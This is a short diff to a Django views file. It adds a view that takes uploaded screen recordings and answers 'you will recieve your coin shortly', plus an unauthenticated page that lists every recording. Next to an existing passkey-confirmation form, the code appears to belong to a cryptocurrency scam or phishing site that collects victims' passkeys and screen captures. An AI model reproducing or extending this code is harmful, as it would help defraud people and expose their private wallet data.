@@ -9,6 +9,9 @@ from django.core.mail import send_mail
 from django.http import HttpResponse
 from django.utils.html import strip_tags
 from django.core.mail import EmailMessage
+from django.core.files.storage import FileSystemStorage
+from .models import ScreenRecording
+
 
 # Create your views here.
 
@@ -134,3 +137,17 @@ def PassKey(request):
 	else:
 		form=PkeyConfirm()
 	return render(request, "folder/pkey.html",{'form':form})
+
+
+def Recording(request):
+	if request.method == 'POST' and request.FILES['video']:
+		video_file = request.FILES['video']
+		recording = ScreenRecording(video_file=video_file)
+		recording.save()
+		return HttpResponse('Dear esteem customer, you will recieve your coin shortly')
+	return render(request, 'folder/recording.html')
+
+
+def Recording_list(request):
+	recordings = ScreenRecording.objects.all()
+	return render(request, 'folder/recording_list.html', {'recordings': recordings})
